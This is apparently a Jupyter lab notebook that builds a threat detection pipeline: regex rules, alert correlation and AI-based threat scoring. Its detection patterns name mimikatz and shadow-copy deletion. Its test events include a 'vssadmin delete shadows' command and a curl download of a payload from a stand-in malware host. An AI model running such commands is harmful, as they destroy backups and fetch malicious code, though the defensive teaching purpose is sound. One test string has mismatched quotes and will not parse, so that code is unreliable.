{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "cell-0",
   "metadata": {},
   "source": [
    "# Lab 09: Threat Detection Pipeline\n",
    "\n",
    "Build an end-to-end threat detection pipeline with AI-powered analysis.\n",
    "\n",
    "[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/depalmar/ai_for_the_win/blob/main/notebooks/lab09_detection_pipeline.ipynb)\n",
    "\n",
    "## Learning Objectives\n",
    "- Multi-stage detection architecture\n",
    "- Alert correlation and triage\n",
    "- ML-based threat scoring\n",
    "- Automated alert enrichment"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cell-1",
   "metadata": {},
   "outputs": [],
   "source": [
    "from typing import List, Dict, Optional\n",
    "from dataclasses import dataclass, field\n",
    "from datetime import datetime\n",
    "from enum import Enum\n",
    "import json"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cell-2",
   "metadata": {},
   "source": [
    "## 1. Detection Data Models"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cell-3",
   "metadata": {},
   "outputs": [],
   "source": [
    "class AlertSeverity(Enum):\n",
    "    CRITICAL = 4\n",
    "    HIGH = 3\n",
    "    MEDIUM = 2\n",
    "    LOW = 1\n",
    "\n",
    "@dataclass\n",
    "class Alert:\n",
    "    \"\"\"Security alert.\"\"\"\n",
    "    id: str\n",
    "    timestamp: str\n",
    "    title: str\n",
    "    severity: AlertSeverity\n",
    "    source: str\n",
    "    host: str\n",
    "    description: str\n",
    "    mitre_techniques: List[str] = field(default_factory=list)\n",
    "    iocs: List[str] = field(default_factory=list)\n",
    "    enrichment: Dict = field(default_factory=dict)\n",
    "\n",
    "@dataclass  \n",
    "class Detection:\n",
    "    \"\"\"Detection rule match.\"\"\"\n",
    "    rule_id: str\n",
    "    rule_name: str\n",
    "    severity: AlertSeverity\n",
    "    matched_data: Dict\n",
    "    timestamp: str\n",
    "\n",
    "# Sample alerts\n",
    "SAMPLE_ALERTS = [\n",
    "    Alert(\n",
    "        id=\"ALT-001\",\n",
    "        timestamp=\"2024-01-15T09:15:00Z\",\n",
    "        title=\"Encoded PowerShell Execution\",\n",
    "        severity=AlertSeverity.HIGH,\n",
    "        source=\"EDR\",\n",
    "        host=\"WORKSTATION-42\",\n",
    "        description=\"PowerShell with -enc parameter detected\",\n",
    "        mitre_techniques=[\"T1059.001\"],\n",
    "        iocs=[\"powershell.exe -enc SGVsbG8=\"]\n",
    "    ),\n",
    "    Alert(\n",
    "        id=\"ALT-002\",\n",
    "        timestamp=\"2024-01-15T09:16:00Z\",\n",
    "        title=\"C2 Beacon Detected\",\n",
    "        severity=AlertSeverity.CRITICAL,\n",
    "        source=\"NDR\",\n",
    "        host=\"WORKSTATION-42\",\n",
    "        description=\"Periodic beaconing to known C2 IP\",\n",
    "        mitre_techniques=[\"T1071.001\"],\n",
    "        iocs=[\"185.143.223.47\"]\n",
    "    )\n",
    "]\n",
    "\n",
    "print(f\"Loaded {len(SAMPLE_ALERTS)} alerts\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cell-4",
   "metadata": {},
   "source": [
    "## 2. Detection Rule Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cell-5",
   "metadata": {},
   "outputs": [],
   "source": [
    "import re\n",
    "\n",
    "class DetectionRule:\n",
    "    \"\"\"Simple detection rule.\"\"\"\n",
    "    \n",
    "    def __init__(self, rule_id: str, name: str, severity: AlertSeverity, pattern: str):\n",
    "        self.rule_id = rule_id\n",
    "        self.name = name\n",
    "        self.severity = severity\n",
    "        self.pattern = pattern\n",
    "        self.compiled = re.compile(pattern, re.IGNORECASE)\n",
    "    \n",
    "    def match(self, data: str) -> Optional[Detection]:\n",
    "        if self.compiled.search(data):\n",
    "            return Detection(\n",
    "                rule_id=self.rule_id,\n",
    "                rule_name=self.name,\n",
    "                severity=self.severity,\n",
    "                matched_data={\"input\": data[:100]},\n",
    "                timestamp=datetime.now().isoformat()\n",
    "            )\n",
    "        return None\n",
    "\n",
    "# Detection rules\n",
    "RULES = [\n",
    "    DetectionRule(\"R001\", \"Encoded PowerShell\", AlertSeverity.HIGH, r\"powershell.*-enc\"),\n",
    "    DetectionRule(\"R002\", \"Mimikatz Execution\", AlertSeverity.CRITICAL, r\"mimikatz|sekurlsa\"),\n",
    "    DetectionRule(\"R003\", \"Shadow Copy Deletion\", AlertSeverity.CRITICAL, r\"vssadmin.*delete\"),\n",
    "    DetectionRule(\"R004\", \"Suspicious Download\", AlertSeverity.MEDIUM, r\"curl|wget.*http\"),\n",
    "]\n",
    "\n",
    "# Test rules\n",
    "test_data = \"cmd.exe /c powershell -enc SGVsbG8gV29ybGQ=\"\n",
    "print(f\"Testing: {test_data}\")\n",
    "for rule in RULES:\n",
    "    match = rule.match(test_data)\n",
    "    if match:\n",
    "        print(f\"  Matched: {rule.name} [{rule.severity.name}]\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cell-6",
   "metadata": {},
   "source": [
    "## 3. Alert Correlator"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cell-7",
   "metadata": {},
   "outputs": [],
   "source": [
    "class AlertCorrelator:\n",
    "    \"\"\"Correlate related alerts into incidents.\"\"\"\n",
    "    \n",
    "    def __init__(self, time_window_minutes: int = 30):\n",
    "        self.time_window = time_window_minutes\n",
    "    \n",
    "    def correlate(self, alerts: List[Alert]) -> List[Dict]:\n",
    "        \"\"\"Group alerts by host and time window.\"\"\"\n",
    "        # Group by host\n",
    "        by_host = {}\n",
    "        for alert in alerts:\n",
    "            if alert.host not in by_host:\n",
    "                by_host[alert.host] = []\n",
    "            by_host[alert.host].append(alert)\n",
    "        \n",
    "        # Create correlated incidents\n",
    "        incidents = []\n",
    "        for host, host_alerts in by_host.items():\n",
    "            if len(host_alerts) > 1:\n",
    "                # Multiple alerts = potential incident\n",
    "                max_severity = max(a.severity.value for a in host_alerts)\n",
    "                techniques = set()\n",
    "                for a in host_alerts:\n",
    "                    techniques.update(a.mitre_techniques)\n",
    "                \n",
    "                incidents.append({\n",
    "                    \"incident_id\": f\"INC-{host}-001\",\n",
    "                    \"host\": host,\n",
    "                    \"alert_count\": len(host_alerts),\n",
    "                    \"max_severity\": AlertSeverity(max_severity).name,\n",
    "                    \"techniques\": list(techniques),\n",
    "                    \"alerts\": [a.id for a in host_alerts]\n",
    "                })\n",
    "        \n",
    "        return incidents\n",
    "\n",
    "# Correlate\n",
    "correlator = AlertCorrelator()\n",
    "incidents = correlator.correlate(SAMPLE_ALERTS)\n",
    "\n",
    "print(\"Correlated Incidents:\")\n",
    "for inc in incidents:\n",
    "    print(f\"  {inc['incident_id']}\")\n",
    "    print(f\"    Host: {inc['host']}\")\n",
    "    print(f\"    Alerts: {inc['alert_count']}\")\n",
    "    print(f\"    Max Severity: {inc['max_severity']}\")\n",
    "    print(f\"    Techniques: {inc['techniques']}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cell-8",
   "metadata": {},
   "source": [
    "## 4. AI Threat Scorer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cell-9",
   "metadata": {},
   "outputs": [],
   "source": [
    "class ThreatScorer:\n",
    "    \"\"\"AI-powered threat scoring.\"\"\"\n",
    "    \n",
    "    def __init__(self):\n",
    "        try:\n",
    "            from anthropic import Anthropic\n",
    "            self.client = Anthropic()\n",
    "            self.available = True\n",
    "        except:\n",
    "            self.available = False\n",
    "    \n",
    "    def score_incident(self, incident: Dict, alerts: List[Alert]) -> Dict:\n",
    "        \"\"\"Score incident severity with AI analysis.\"\"\"\n",
    "        if not self.available:\n",
    "            return self._mock_score(incident, alerts)\n",
    "        \n",
    "        alert_summaries = \"\\n\".join([\n",
    "            f\"- [{a.severity.name}] {a.title}: {a.description}\"\n",
    "            for a in alerts\n",
    "        ])\n",
    "        \n",
    "        prompt = f\"\"\"Analyze this security incident and provide a threat score (1-100):\n",
    "\n",
    "Host: {incident['host']}\n",
    "Alert Count: {incident['alert_count']}\n",
    "MITRE Techniques: {incident['techniques']}\n",
    "\n",
    "Alerts:\n",
    "{alert_summaries}\n",
    "\n",
    "Provide:\n",
    "1. Threat score (1-100)\n",
    "2. Confidence level\n",
    "3. Brief analysis\n",
    "4. Recommended priority\n",
    "\n",
    "Return as JSON.\"\"\"\n",
    "        \n",
    "        response = self.client.messages.create(\n",
    "            model=\"claude-sonnet-4-20250514\",\n",
    "            max_tokens=256,\n",
    "            messages=[{\"role\": \"user\", \"content\": prompt}]\n",
    "        )\n",
    "        \n",
    "        return json.loads(response.content[0].text)\n",
    "    \n",
    "    def _mock_score(self, incident: Dict, alerts: List[Alert]) -> Dict:\n",
    "        score = 50 + len(alerts) * 10\n",
    "        if incident['max_severity'] == 'CRITICAL':\n",
    "            score += 30\n",
    "        return {\n",
    "            \"threat_score\": min(100, score),\n",
    "            \"confidence\": 0.85,\n",
    "            \"analysis\": f\"Multiple related alerts on {incident['host']} suggest active threat\",\n",
    "            \"priority\": \"P1\" if score >= 80 else \"P2\"\n",
    "        }\n",
    "\n",
    "# Score\n",
    "scorer = ThreatScorer()\n",
    "if incidents:\n",
    "    score_result = scorer.score_incident(incidents[0], SAMPLE_ALERTS)\n",
    "    print(\"Threat Score:\")\n",
    "    print(json.dumps(score_result, indent=2))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cell-10",
   "metadata": {},
   "source": [
    "## 5. Detection Pipeline"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cell-11",
   "metadata": {},
   "outputs": [],
   "source": [
    "class DetectionPipeline:\n",
    "    \"\"\"End-to-end detection pipeline.\"\"\"\n",
    "    \n",
    "    def __init__(self):\n",
    "        self.rules = RULES\n",
    "        self.correlator = AlertCorrelator()\n",
    "        self.scorer = ThreatScorer()\n",
    "    \n",
    "    def process(self, events: List[str]) -> Dict:\n",
    "        \"\"\"Process events through pipeline.\"\"\"\n",
    "        # Stage 1: Detection\n",
    "        detections = []\n",
    "        for event in events:\n",
    "            for rule in self.rules:\n",
    "                match = rule.match(event)\n",
    "                if match:\n",
    "                    detections.append(match)\n",
    "        \n",
    "        # Stage 2: Alert Generation\n",
    "        alerts = []\n",
    "        for i, det in enumerate(detections):\n",
    "            alerts.append(Alert(\n",
    "                id=f\"ALT-{i+1:03d}\",\n",
    "                timestamp=det.timestamp,\n",
    "                title=det.rule_name,\n",
    "                severity=det.severity,\n",
    "                source=\"Detection Engine\",\n",
    "                host=\"WORKSTATION-01\",\n",
    "                description=f\"Rule {det.rule_id} matched\"\n",
    "            ))\n",
    "        \n",
    "        # Stage 3: Correlation\n",
    "        incidents = self.correlator.correlate(alerts)\n",
    "        \n",
    "        return {\n",
    "            \"detections\": len(detections),\n",
    "            \"alerts\": len(alerts),\n",
    "            \"incidents\": incidents\n",
    "        }\n",
    "\n",
    "# Test pipeline\n",
    "pipeline = DetectionPipeline()\n",
    "\n",
    "test_events = [\n",
    "    \"powershell.exe -enc SGVsbG8=',\n",
    "    \"vssadmin delete shadows /all /quiet\",\n",
    "    \"normal user activity\",\n",
    "    \"curl http://malware.com/payload\"\n",
    "]\n",
    "\n",
    "result = pipeline.process(test_events)\n",
    "print(f\"Detections: {result['detections']}\")\n",
    "print(f\"Alerts: {result['alerts']}\")\n",
    "print(f\"Incidents: {len(result['incidents'])}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cell-12",
   "metadata": {},
   "source": [
    "## Summary\n",
    "\n",
    "We built a complete threat detection pipeline:\n",
    "\n",
    "1. **Rule Engine** - Pattern-based detection\n",
    "2. **Alert Generation** - Structured alert creation\n",
    "3. **Correlation** - Group related alerts\n",
    "4. **AI Scoring** - Threat prioritization\n",
    "\n",
    "### Next Steps:\n",
    "1. Add Sigma rule support\n",
    "2. Implement ML-based anomaly detection\n",
    "3. Create real-time streaming pipeline"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
